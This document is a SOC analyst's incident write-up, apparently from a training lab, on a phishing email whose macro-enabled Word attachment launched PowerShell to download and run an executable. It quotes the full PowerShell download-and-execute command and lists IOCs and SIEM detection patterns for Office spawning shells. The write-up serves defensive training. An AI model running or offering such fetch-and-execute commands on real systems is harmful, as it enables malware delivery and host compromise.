

# SOC205 - Malicious Macro has been executed — Case #231

## 🚨 Raw Alert Details
```text
EventID : 231
Event Time : Feb, 28, 2024, 08:42 AM
Rule : SOC205 - Malicious Macro has been executed
Level : Security Analyst
Hostname : Jayne
Ip Address : 172.16.17.198
File Name : edit1-invoice.docm
File Hash : 1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0
Trigger Reason : Suspicious file detected on system.
AV/EDR Action : Detected
```

## Alert Overview
- **Severity:** High
- **Detection Source:** EDR / Sysmon
- **Asset Affected:** Jayne (172.16.17.198)
- **Threat Type:** Malicious Document (MalDoc) / PowerShell Downloader
- **Status:** True Positive (Compromised)

## 🧠 Deep Dive: Understanding Macro-Based Droppers
This incident highlights a classic Initial Access and Execution attack chain. Threat actors utilize Visual Basic for Applications (VBA) macros embedded within Microsoft Word documents (`.docm`) to establish a foothold. 

**The Mechanics:** The strategy relies on user interaction. Once the victim opens the document and clicks "Enable Content," the hidden VBA script executes. Rather than containing the full malware payload within the document itself (which drastically increases the file size and the likelihood of AV detection), the macro acts as a "Stager." It leverages native Windows tools (like `powershell.exe`) to reach out to an external Command and Control (C2) server, download the actual malware executable, and launch it.

## Investigation Steps

### 1. File Reputation & Initial Access (Phishing)
The investigation began by verifying the hash provided in the alert (`1a819d18c...`).
- **OSINT Verification:** VirusTotal flagged the `.docm` file with a score of 28/63, classifying it as a malicious macro-enabled document.
<img width="910" height="160" alt="image" src="https://github.com/user-attachments/assets/41eab28e-f1af-4b0e-9f9c-1018a632f03f" />


- **Email Triage:** The Email Security gateway confirmed how the file arrived. An email with the subject "February Membership Fee" was sent to `jayne@letsdefend.io` from `jake.admin@cybercommunity.info`. The email successfully bypassed the gateway (`Action: Allowed`).
<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/e3560913-3458-41d9-a8d2-ef58a07ead5c" />


### 2. Execution Verification (Process Tracking)
To determine if the user interacted with the malicious attachment, the raw endpoint logs were analyzed.
- **Process Creation (Event ID 1):** The logs confirmed that `WINWORD.EXE` opened the malicious file: 
  `Command Line: 'C:\Program Files\Microsoft Office\Office14\WINWORD.EXE' /n 'C:\Users\admin\AppData\Local\Temp\edit1-invoice.docm'`
<img width="500" height="250" alt="image" src="https://github.com/user-attachments/assets/58f0b107-058f-4de7-a71a-038ada56eabb" />


### 3. Payload Delivery & Living off the Land
Following the execution of Word, the logs revealed the macro spawning a child process to download the secondary payload.
- **Process Creation (Event ID 4688):** `powershell.exe` was launched with the following command line:
  `POWERSHELL (NEW-OBJECT SYSTEM.NET.WEBCLIENT).DOWNLOADFILE('HTTP://WWW.GREYHATHACKER.NET/TOOLS/MESSBOX.EXE','MESS.EXE');START-PROCESS 'MESS.EXE'`
- **Analysis:** This is a definitive Living off the Land (LotL) technique. The macro commanded PowerShell to connect to the domain `greyhathacker.net`, download an executable named `messbox.exe`, save it locally as `MESS.EXE`, and immediately execute it.

<img width="500" height="250" alt="image" src="https://github.com/user-attachments/assets/9f36aefc-9038-4ec2-ae70-735d9e4d9e3b" />


### 4. Network and DNS Correlation
To verify if the PowerShell download was successful, Sysmon and network logs were reviewed.
- **DNS Query (Event ID 22):** Sysmon captured `powershell.exe` querying `WWW.GREYHATHACKER.NET`, which resolved to the IP address `92.204.221.16`. This confirms the endpoint successfully reached out to the attacker's infrastructure.
- **EDR Evasion:** While the raw Sysmon logs captured the execution, the standard EDR dashboard (Processes/Terminal History) appeared clean. This discrepancy suggests the malware employs defense evasion techniques or that the EDR agent experienced a telemetry gap during execution.


## Analysis and Findings
The incident is a confirmed **True Positive**. The user (Jayne) was successfully phished. The victim opened a malicious `.docm` file and enabled macros. The macro successfully spawned PowerShell, circumventing basic protections, and downloaded a secondary payload (`mess.exe`) from `greyhathacker.net`. The Sysmon logs confirm the execution chain and the successful DNS resolution of the attacker's infrastructure. The endpoint is compromised.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Initial Access** | T1566.001 | Phishing: Spearphishing Attachment |
| **Execution** | T1204.002 | User Execution: Malicious File |
| **Execution** | T1059.001 | Command and Scripting Interpreter: PowerShell |
| **Command and Control** | T1105 | Ingress Tool Transfer |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| Hash (SHA256) | `1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0` | Malicious First-Stage Document (`edit1-invoice.docm`) |
| Domain | `www.greyhathacker.net` | Payload Delivery Domain |
| IP Address | 92.204.221.16 | IP resolving to attacker domain |
| URL | `http://www.greyhathacker.net/tools/messbox.exe` | Secondary Payload Location |
| File Name | `MESS.EXE` | Executed Secondary Payload |

## 🛠️ Detection Engineering & Hunting Logic
To improve automated detection of this attack chain, the following logic should be implemented in the SIEM:
- **Detection 1 (Office Spawning Shells):** Alert when `ParentImage="*\WINWORD.EXE" OR "*\EXCEL.EXE"` AND `Image="*\powershell.exe" OR "*\cmd.exe"`.
- **Detection 2 (PowerShell Download Cradles):** Alert when Event ID 4104 (Script Block Logging) or Event ID 4688 (Process Creation) contains `CommandLine="*System.Net.WebClient*" AND "*DownloadFile*"`.

## 🚀 Decision Tree for Macro-Based Droppers
1. **Analyze Initial Vector:** Did the user receive a phishing email containing an Office document with macros enabled (`.docm`, `.xlsm`)?
   - If Yes -> Proceed to Endpoint Telemetry.
2. **Check Process Tree (Event ID 1/4688):** Did the Office application (`WINWORD.EXE`) launch successfully? Did it spawn a suspicious child process (`powershell.exe`)?
   - If Yes -> High probability of Macro exploitation.
3. **Analyze Command Line:** Did the resulting command shell attempt to download a file from an external URL using `Net.WebClient` or `Invoke-WebRequest`?
   - If Yes -> **Verdict: True Positive - Successful Compromise.**
4. **Action:** Isolate host, purge the email globally, and block the C2 domain.

## Response and Closure
- **Action Taken:** The compromised endpoint (Jayne / 172.16.17.198) was **Isolated** from the network. The phishing email was purged from the Exchange server to prevent further clicks. The domain `greyhathacker.net` and IP `92.204.221.16` were added to the perimeter blocklist.
- **Containment Required:** Yes.
- **Closure Reason:** True Positive. Successful phishing attack leading to macro execution and payload delivery.

## Recommendations
1. **Enforce Macro Security (GPO):** Implement Microsoft Group Policy Objects (GPO) to "Block macros from running in Office files from the Internet" (Mark of the Web enforcement). This would have prevented the `AutoOpen` function from executing.
2. **Attack Surface Reduction (ASR):** Enable the ASR rule: *"Block all Office applications from creating child processes."* This completely neutralizes the ability of `WINWORD.EXE` to spawn `powershell.exe`.
3. **EDR Health Check:** Investigate why the primary EDR dashboard failed to populate the process execution history despite Sysmon capturing the events. Ensure the EDR agent on `172.16.17.198` is communicating properly and not actively being tampered with by the `mess.exe` payload.

## 🛠️ Skills & Tools Used
- **EDR & Sysmon Analysis:** Correlating Windows Event IDs (1, 4688, 22, 4104) to reconstruct an attack chain.
- **TTP Identification (LOLBins):** Recognizing PowerShell download cradles (`System.Net.WebClient`).
- **Phishing Triage:** Analyzing malicious attachments and sender context.
- **Incident Containment & Eradication:** Host isolation and threat intelligence integration.
